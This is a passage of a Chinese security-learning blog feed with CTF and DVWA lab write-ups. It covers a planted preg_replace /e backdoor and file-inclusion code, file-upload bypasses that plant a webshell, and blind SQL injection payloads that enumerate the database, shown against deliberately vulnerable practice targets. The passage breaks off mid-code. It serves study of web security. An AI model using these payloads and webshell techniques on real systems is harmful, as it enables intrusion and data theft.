   &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align:center&quot;&gt;</span><br><span class="line">            &lt;p class&#x3D;&quot;lead&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;input&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;ta:text&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;text&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($page &#x3D;&#x3D;&#x3D; &#39;index.php&#39;) &#123;</span><br><span class="line">                    die(&#39;Ok&#39;);</span><br><span class="line">                &#125;</span><br><span class="line">                    include($page);</span><br><span class="line">                    die();</span><br><span class="line">                ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>其中最关键的代码内容：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码审计：当服务器收到来自ip=127.0.0.1的访问请求时，会认为其是管理员。此时可以伴随上传三个参数，作为preg_replace()函数的变量。</p><p><strong>学习：</strong></p><p>preg_replace()函数危险的/e修饰符（<a href="https://www.jb51.net/article/38714.htm%EF%BC%89">https://www.jb51.net/article/38714.htm）</a></p><p>说明：/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p><p><strong>preg_replace($pattern, $replacement, $subject)</strong><br>作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。<br>$pattern:             要搜索的模式，可以是字符串或一个字符串数组。<br>$replacement:   用于替换的字符串或字符串数组。<br>$subject:             要搜索替换的目标字符串或字符串数组。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NewsCenter&quot;&gt;&lt;a href=&quot;#NewsCenter&quot; class=&quot;headerlink&quot; title=&quot;NewsCenter&quot;&gt;&lt;/a&gt;NewsCenter&lt;/h1&gt;&lt;h1 id=&quot;Web-php-unserialize：（反序列化）&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>DVWA—Weak Session IDs</title>
    <link href="http://example.com/2021/03/12/DVWA%E2%80%94Weak%20Session%20IDs/"/>
    <id>http://example.com/2021/03/12/DVWA%E2%80%94Weak%20Session%20IDs/</id>
    <published>2021-03-12T08:50:01.000Z</published>
    <updated>2021-03-13T02:25:32.044Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Weak Session IDs：<br>密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。<br>当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。SessionID一旦在生命周期内被窃取，就等同于账户失窃。同时由于SessionID是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。<br>————————————————<br>版权声明：摘自为CSDN博主「baynk」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/u014029795/article/details/102795784">https://blog.csdn.net/u014029795/article/details/102795784</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;Weak Session IDs：&lt;br&gt;密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWA—File Uplod</title>
    <link href="http://example.com/2021/03/12/DVWA%E2%80%94File%20Uplod/"/>
    <id>http://example.com/2021/03/12/DVWA%E2%80%94File%20Uplod/</id>
    <published>2021-03-12T02:37:19.000Z</published>
    <updated>2021-03-12T11:38:03.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前刷过upload就不多说了</p><h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>我们可以看到服务器对上传文件的类型、内容没有做任何检查、过滤，那么我们上传webshell.php，连接蚁剑，即可控制整个服务器。</p><p>![1](DVWA—File Uplod/1.png)</p><h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">&quot;image/jpeg&quot;</span> || $uploaded_type == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到，服务器对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。</p><p><strong>法一：搭配文件包含漏洞</strong></p><p>我们上传文件名为webshell.png，内容为一句话木马，然后利用文件包含漏洞的特性，借助Medium级别的文件包含漏洞来获取webshell权限。用蚁剑连接：<a href="http://localhost:81/vulnerabilities/fi/?page=hthttp://tp://localhost:81/hackable/uploads/webshell.png%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%91%E7%8E%B0%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%EF%BC%8C%E8%BF%94%E5%9B%9E%E5%86%85%E5%AE%B9%E4%B8%BA%E7%A9%BA%E3%80%82%E5%8E%9F%E6%9D%A5%EF%BC%8C%E8%9A%81%E5%89%91%E5%9C%A8%E8%BF%9E%E6%8E%A5%E6%97%B6%E5%B9%B6%E6%B2%A1%E6%9C%89%E6%90%BA%E5%B8%A6cookie%EF%BC%8C%E6%AD%A3%E5%9B%A0%E4%B8%BA%E7%BC%BA%E5%B0%91cookie%E5%80%BC%E6%89%8D%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F%E3%80%82">http://localhost:81/vulnerabilities/fi/?page=hthttp://tp://localhost:81/hackable/uploads/webshell.png，但是发现连接失败，返回内容为空。原来，蚁剑在连接时并没有携带cookie，正因为缺少cookie值才无法连接成功。</a></p><p>解决方法就是添加cookie，具体请看：<a href="https://blog.csdn.net/qq_39174983/article/details/111983259?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161426249816780261924019%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161426249816780261924019&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111983259.pc_search_result_no_baidu_js&amp;utm_term=DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EHigh">https://blog.csdn.net/qq_39174983/article/details/111983259?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161426249816780261924019%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161426249816780261924019&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111983259.pc_search_result_no_baidu_js&amp;utm_term=DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EHigh</a></p><p><strong>法二：抓包修改</strong></p><p>我们先上传webshell.png，内容为一句话木马，然后抓包，修改文件名后缀为php</p><p>![2](DVWA—File Uplod/2.png)</p><p>蚁剑连接即可</p><p>![1](DVWA—File Uplod/1.png)</p><h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&quot;jpg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到服务器这次检查了文件名后缀，设置了白名单，并且getimagesize函数检查了文件头内容。</p><p>我们可以利用图片马搭配文件包含漏洞完成绕过。具体步骤和Medium级别的一句话木马上传没有什么差别。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;之前刷过upload就不多说了&lt;/p&gt;
&lt;h1 id=&quot;Low：&quot;&gt;&lt;a href=&quot;#Low：&quot; class=&quot;headerlin</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWA—SQL Injection (Blind)</title>
    <link href="http://example.com/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/"/>
    <id>http://example.com/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/</id>
    <published>2021-03-10T08:48:00.000Z</published>
    <updated>2021-03-12T11:38:15.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>SQL盲注与一般SQL注入的区别在于一般SQL注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行的结果，甚至连注入语句是否执行都无法得知。</p><h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><p><strong>1）判断注入点即其类型</strong></p><p>1’ and ‘1’=’1![2](DVWA—SQL Injection (Blind)/2.png)</p><p>1’ and ‘1’=’2![1](DVWA—SQL Injection (Blind)/1.png)</p><p>可知存在注入点，且注入类型为<code>&#39;</code></p><p><strong>2）猜测SQL查询语句的字段数</strong></p><p>1’ order by 2#![2](DVWA—SQL Injection (Blind)/2.png)</p><p>1’ order by 3#![1](DVWA—SQL Injection (Blind)/1.png)</p><p><strong>3）爆库</strong></p><p>1’ and length(database())=1 # ，不存在</p><p>1’ and length(database())=2 # ，不存在</p><p>1’ and length(database())=3 # ，不存在</p><p>1’ and length(database())=4 # ，存在，因此库名长度为四</p><p>1’ and left(database(),1)=’d’#，存在，一次库名的首字母为<code>d</code>，剩下的一次类推，得库名为dvwa</p><p><strong>4）爆表</strong></p><ul><li><p>先猜表个数</p><p>1’ and (select count(table_name) from information_schema.tables where table_schema=database())=2 #，存在，即有两个表</p></li><li><p>猜表名长度</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，存在，第一个表名有9个字母</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 #</p><p>存在，第二个表名有5个字母</p></li><li><p>猜表名组成字符</p><p>1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)=’u’ #，存在，说明第二个表的表名首字母为<code>u</code>，以此类推可得第二个表表名为<code>users</code></p></li></ul><p><strong>5）爆列</strong></p><p>爆列和爆表基本相似，仅需稍微修改一点即可，下面就举猜表个数为例，其余自行变通。</p><p>1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=14 #，存在，说明有14个列</p><p><strong>6）爆值</strong></p><p>爆值手动操作量太大了，这里就以爆列：user为例</p><p>1’ and substr((select user from users limit 0,1),1,1)=’a’#</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    $id = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $id ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span 